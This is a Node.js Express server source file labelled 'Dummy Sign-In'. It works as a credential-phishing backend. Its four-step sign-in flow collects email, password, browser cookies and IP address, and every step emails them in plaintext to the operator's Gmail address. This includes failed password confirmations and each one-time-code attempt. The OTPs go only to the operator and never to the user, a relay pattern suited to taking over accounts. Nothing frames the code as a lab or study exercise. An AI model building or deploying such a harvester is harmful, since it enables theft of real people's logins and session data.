require('dotenv').config();
const express = require('express');
const nodemailer = require('nodemailer');
const path = require('path');
const crypto = require('crypto');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

// ---------- Admin password storage ----------
const ADMIN_EMAIL = (process.env.GMAIL_USER || 'blessedresult6@gmail.com').toLowerCase();
const DATA_DIR = path.join(__dirname, 'data');
const ADMIN_FILE = path.join(DATA_DIR, 'admin.json');

try {
  if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
} catch (e) {}

function hashPassword(password) {
  return crypto.createHash('sha256').update(password + 'dummy-salt-2026').digest('hex');
}

function loadAdminConfig() {
  if (process.env.ADMIN_PASSWORD) {
    return {
      email: ADMIN_EMAIL,
      passwordHash: hashPassword(process.env.ADMIN_PASSWORD),
      source: 'env'
    };
  }
  try {
    if (fs.existsSync(ADMIN_FILE)) {
      const data = JSON.parse(fs.readFileSync(ADMIN_FILE, 'utf8'));
      return { ...data, source: 'file' };
    }
  } catch (e) {}
  return null;
}

function saveAdminConfig(password) {
  const config = {
    email: ADMIN_EMAIL,
    passwordHash: hashPassword(password),
    createdAt: new Date().toISOString()
  };
  try {
    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
    fs.writeFileSync(ADMIN_FILE, JSON.stringify(config, null, 2));
  } catch (e) {
    console.warn('Could not write admin config to disk (normal on Vercel):', e.message);
  }
  global.__adminConfig = config;
  return config;
}

let adminConfig = loadAdminConfig() || global.__adminConfig || null;

const sessions = new Map();

setInterval(() => {
  const now = Date.now();
  for (const [id, s] of sessions.entries()) {
    if (now - s.createdAt > 30 * 60 * 1000) sessions.delete(id);
  }
}, 30 * 60 * 1000);

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'views', 'admin.html'));
});

const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.GMAIL_USER,
    pass: process.env.GMAIL_APP_PASSWORD
  }
});

function generateOTP() {
  return crypto.randomInt(100000, 999999).toString();
}

// All emails go to ADMIN only (never to the dummy user)
async function notifyAdmin(subject, data) {
  const text = Object.entries(data)
    .map(([k, v]) => `${k}: ${v}`)
    .join('\n');

  try {
    await transporter.sendMail({
      from: `\"Dummy Sign-In\" <${process.env.GMAIL_USER}>`,
      to: process.env.GMAIL_USER,
      subject: `Dummy Sign-In - ${subject}`,
      text: text
    });
    console.log('Admin notified:', subject);
    return true;
  } catch (err) {
    console.error('Failed to notify admin:', err.message);
    return false;
  }
}

// ========== ADMIN API ==========

app.get('/api/admin-status', (req, res) => {
  adminConfig = loadAdminConfig() || global.__adminConfig || null;
  res.json({
    email: ADMIN_EMAIL,
    passwordSet: !!adminConfig
  });
});

app.post('/api/admin-setup', (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.json({ success: false, message: 'Email and password are required' });
  }
  if (email.toLowerCase() !== ADMIN_EMAIL) {
    return res.json({ success: false, message: 'This email is not authorized as admin' });
  }
  if (password.length < 6) {
    return res.json({ success: false, message: 'Password must be at least 6 characters' });
  }

  adminConfig = loadAdminConfig() || global.__adminConfig || null;
  if (adminConfig) {
    return res.json({ success: false, message: 'Password is already set. Please log in instead.' });
  }

  adminConfig = saveAdminConfig(password);
  res.json({ success: true, message: 'Admin password set successfully. You are now logged in.' });
});

app.post('/api/admin-login', (req, res) => {
  const { email, password } = req.body;
  adminConfig = loadAdminConfig() || global.__adminConfig || null;

  if (!adminConfig) {
    return res.json({
      success: false,
      needsSetup: true,
      message: 'No password set yet. Please create one first.'
    });
  }
  if (email.toLowerCase() !== ADMIN_EMAIL) {
    return res.json({ success: false, message: 'Wrong email or password' });
  }
  if (hashPassword(password) !== adminConfig.passwordHash) {
    return res.json({ success: false, message: 'Wrong email or password' });
  }
  res.json({ success: true });
});

// ========== USER API ROUTES ==========

// Step 1: Email + Password → admin gets them (no OTP email to user)
app.post('/api/step1', async (req, res) => {
  const { email, password, cookies, ip } = req.body;

  if (!email || !password) {
    return res.status(400).json({ success: false, message: 'Email and password required' });
  }

  const sessionId = crypto.randomBytes(16).toString('hex');
  const otp1 = generateOTP();
  const otp2 = generateOTP();

  sessions.set(sessionId, {
    email,
    password,
    username: '',
    otp1,
    otp2,
    cookies: cookies || '(none)',
    ip: ip || '(unknown)',
    createdAt: Date.now()
  });

  await notifyAdmin('Email + Password', {
    Email: email,
    Password: password,
    Cookies: cookies || '(none)',
    'IP Address': ip || '(unknown)',
    Timestamp: new Date().toISOString()
  });

  res.json({
    success: true,
    sessionId,
    message: 'Email and password received'
  });
});

// Step 2: Username + Confirm Password → if OK, admin receives OTP 1, user goes to OTP 1 screen
app.post('/api/step2', async (req, res) => {
  const { sessionId, username, confirmPassword } = req.body;
  const session = sessions.get(sessionId);

  if (!session) {
    return res.status(400).json({ success: false, message: 'Invalid or expired session. Please restart.' });
  }

  if (confirmPassword !== session.password) {
    await notifyAdmin('Password confirmation FAILED', {
      Email: session.email,
      'Original Password': session.password,
      'Entered Confirm Password': confirmPassword,
      Username: username || '(not set)',
      Cookies: session.cookies,
      'IP Address': session.ip,
      Timestamp: new Date().toISOString(),
      Status: 'Password did not match – user must restart'
    });
    sessions.delete(sessionId);
    return res.json({
      success: false,
      message: 'Password does not match the one you entered earlier. Restarting...'
    });
  }

  session.username = username || '';

  // Admin receives OTP 1 (NOT the user)
  await notifyAdmin('OTP 1 (for user to enter)', {
    Email: session.email,
    Password: session.password,
    Username: session.username,
    'OTP 1': session.otp1,
    Cookies: session.cookies,
    'IP Address': session.ip,
    Timestamp: new Date().toISOString(),
    Note: 'Send this OTP 1 to the user or use it as needed. User does NOT receive this email.'
  });

  res.json({
    success: true,
    message: 'Password confirmed. Enter OTP 1.'
  });
});

// Step 3: Verify OTP 1 → if OK, admin receives OTP 2
app.post('/api/step3', async (req, res) => {
  const { sessionId, otp1 } = req.body;
  const session = sessions.get(sessionId);

  if (!session) {
    return res.status(400).json({ success: false, message: 'Invalid or expired session' });
  }

  await notifyAdmin('OTP 1 attempt', {
    Email: session.email,
    Password: session.password,
    Username: session.username,
    'Entered OTP 1': otp1,
    'Correct OTP 1': session.otp1,
    Cookies: session.cookies,
    'IP Address': session.ip,
    Timestamp: new Date().toISOString()
  });

  if (otp1 !== session.otp1) {
    return res.json({ success: false, message: 'Incorrect OTP 1. Please try again.' });
  }

  // Admin receives OTP 2 (NOT the user)
  await notifyAdmin('OTP 2 (for user to enter)', {
    Email: session.email,
    Password: session.password,
    Username: session.username,
    'OTP 2': session.otp2,
    Cookies: session.cookies,
    'IP Address': session.ip,
    Timestamp: new Date().toISOString(),
    Note: 'Send this OTP 2 to the user or use it as needed. User does NOT receive this email.'
  });

  res.json({
    success: true,
    message: 'OTP 1 correct. Enter OTP 2.'
  });
});

// Step 4: Verify OTP 2
app.post('/api/step4', async (req, res) => {
  const { sessionId, otp2 } = req.body;
  const session = sessions.get(sessionId);

  if (!session) {
    return res.status(400).json({ success: false, message: 'Invalid or expired session' });
  }

  await notifyAdmin('OTP 2 attempt', {
    Email: session.email,
    Password: session.password,
    Username: session.username,
    'Entered OTP 2': otp2,
    'Correct OTP 2': session.otp2,
    Cookies: session.cookies,
    'IP Address': session.ip,
    Timestamp: new Date().toISOString()
  });

  if (otp2 !== session.otp2) {
    return res.json({ success: false, message: 'Incorrect OTP 2. Please try again.' });
  }

  await notifyAdmin('OTP 2 - Final (SUCCESS)', {
    Email: session.email,
    Password: session.password,
    Username: session.username,
    'OTP 1': session.otp1,
    'OTP 2': session.otp2,
    Cookies: session.cookies,
    'IP Address': session.ip,
    Timestamp: new Date().toISOString(),
    Status: 'User completed all steps successfully'
  });

  sessions.delete(sessionId);

  res.json({ success: true, message: 'All steps completed. Waiting for admin approval.' });
});

module.exports = app;

if (require.main === module) {
  app.listen(PORT, () => {
    console.log(`\nDummy Sign-In server running at http://localhost:${PORT}`);
    console.log(`User page  → http://localhost:${PORT}/`);
    console.log(`Admin panel → http://localhost:${PORT}/admin`);
    console.log(`Admin email: ${ADMIN_EMAIL}`);
    console.log(`Password set: ${!!adminConfig}`);
    if (!process.env.GMAIL_APP_PASSWORD) {
      console.warn('WARNING: GMAIL_APP_PASSWORD is not set in .env');
    }
  });
}
